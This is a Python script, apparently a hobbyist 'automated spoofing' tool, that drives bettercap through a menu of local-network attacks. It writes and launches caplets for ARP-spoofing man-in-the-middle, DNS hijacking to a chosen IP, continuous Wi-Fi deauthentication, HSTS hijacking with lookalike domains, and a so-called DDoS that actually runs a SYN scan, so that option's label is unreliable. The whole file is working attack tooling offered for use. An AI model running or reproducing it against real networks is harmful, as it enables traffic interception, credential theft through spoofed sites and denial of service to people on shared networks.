import subprocess
import psutil
import os
import sys

if os.geteuid() != 0:
    print("Run this script with sudo!")
    sys.exit(1)


print("Installing Tools Needed..")
print("Installing Tools Needed...")

try:
    downloadbettercap = subprocess.run(["sudo", "apt", "install", "bettercap"], text=True, capture_output=True)
    print(downloadbettercap.stdout)
except:
    print("An error happend try run it as sudo or make sure internet is working")
    exit




os.system("clear")
print("""
______ _____  ___    ___  _____ _   _ _____ _   _  ________  ____________________ _      _____ 
|  _  \_   _|/ _ \  / _ \|_   _| \ | |_   _| | | ||  ___|  \/  |_   _|  _  \  _  \ |    |  ___|
| | | | | | / /_\ \/ /_\ \ | | |  \| | | | | |_| || |__ | .  . | | | | | | | | | | |    | |__  
| | | | | | |  _  ||  _  | | | | . ` | | | |  _  ||  __|| |\/| | | | | | | | | | | |    |  __| 
| |/ / _| |_| | | || | | |_| |_| |\  | | | | | | || |___| |  | |_| |_| |/ /| |/ /| |____| |___ 
|___/  \___/\_| |_/\_| |_/\___/\_| \_/ \_/ \_| |_/\____/\_|  |_/\___/|___/ |___/ \_____/\____/ 
                                                                                               

--------------------------------------------------------------------------------------------------
Automated Tool for Spoofing | Developer: Diaa | Version: 0.1 Beta 
--------------------------------------------------------------------------------------------------
                                                                                               

""")

print("Choose the attack")
print("1) Spoof on the network (ManInTheMiddle)")
print("2) Replace websites (DNS Hijacking)")
print("3) Turn off the WiFi")
print("4) DDoS a Network")
print("5) Make HSTS hijacking")
print("6) Make a HSTS Hijack for website that support it else make a DNS Hijacking")

attack = input("> ")

def Spoof():
    process = subprocess.Popen(
      ["sudo", "bettercap", "-caplet", "mitm.cap"],
      stdout=subprocess.PIPE,
      text=True,
    )

    for line in process.stdout:
        print(line, end="")

def dnsHijacking():
    website = input("Website to hijack (e.g., example.com): ")
    new_ip = input("New IP address to send them to: ")

    caplet_code = f"""
net.probe on
set arp.spoof.fullduplex true
arp.spoof on
set dns.spoof.domains {website}
set dns.spoof.address {new_ip}
dns.spoof on
"""

    with open("temp.cap", "w") as f:
        f.write(caplet_code)

    try:
        subprocess.run(["bettercap", "-caplet", "temp.cap"])
    except KeyboardInterrupt:
        print("\nStopping...")
    finally:
        if os.path.exists("temp.cap"):
            os.remove("temp.cap")

def turnOffWiFi():
    interface = input("Enter wireless interface name (e.g., wlan0): ")
    bssid = input("Enter target AP BSSID (or type 'all' for everything): ")
    
    caplet_code = f"""
set wifi.interface {interface}
wifi.recon on
wifi.deauth {bssid}
"""
    with open("wifi_off.cap", "w") as f:
        f.write(caplet_code)

    try:
        print("Launching continuous deauth attack (Press Ctrl+C to stop)...")
        subprocess.run(["sudo", "bettercap", "-eval", f"set wifi.interface {interface}; wifi.recon on; set ticker.period 1; set ticker.commands 'wifi.deauth {bssid}'; ticker on"])
    except KeyboardInterrupt:
        print("\nStopping WiFi attack...")
    finally:
        if os.path.exists("wifi_off.cap"):
            os.remove("wifi_off.cap")

def ddosNetwork():
    target_ip = input("Enter target IP address for flooding: ")
    try:
        print(f"Starting SYN flood / packet flood towards {target_ip} (Press Ctrl+C to stop)...")
        subprocess.run(["sudo", "bettercap", "-eval", f"net.probe on; set syn.scan.target {target_ip}; syn.scan on"])
    except KeyboardInterrupt:
        print("\nStopping network flood...")

def hstsHijacking():
    domain = input("Enter domain to target for HSTS hijacking (e.g., google.com): ")
    fake_domain = input("Enter replacement domain (e.g., googl3.com): ")
    
    caplet_code = f"""
set hstshijack.targets {domain}
set hstshijack.replacements {fake_domain}
hstshijack on
"""
    with open("hsts_temp.cap", "w") as f:
        f.write(caplet_code)

    try:
        subprocess.run(["sudo", "bettercap", "-caplet", "hsts_temp.cap"])
    except KeyboardInterrupt:
        print("\nStopping HSTS Hijack...")
    finally:
        if os.path.exists("hsts_temp.cap"):
            os.remove("hsts_temp.cap")

def hstsOrDns():
    print("Initializing smart fallback mode (HSTS Hijack with DNS proxy wrapper)...")
    domain = input("Enter target domain: ")
    fake_ip = input("Enter fallback local IP address for DNS redirection: ")
    
    caplet_code = f"""
set hstshijack.targets {domain}
hstshijack on
set dns.spoof.domains {domain}
set dns.spoof.address {fake_ip}
dns.spoof on
"""
    with open("smart_temp.cap", "w") as f:
        f.write(caplet_code)

    try:
        subprocess.run(["sudo", "bettercap", "-caplet", "smart_temp.cap"])
    except KeyboardInterrupt:
        print("\nStopping operation...")
    finally:
        if os.path.exists("smart_temp.cap"):
            os.remove("smart_temp.cap")

if attack == "1":
    Spoof()
elif attack == "2":
    dnsHijacking()
elif attack == "3":
    turnOffWiFi()
elif attack == "4":
    ddosNetwork()
elif attack == "5":
    hstsHijacking()
elif attack == "6":
    hstsOrDns()
else:
    print("Invalid option selected.")
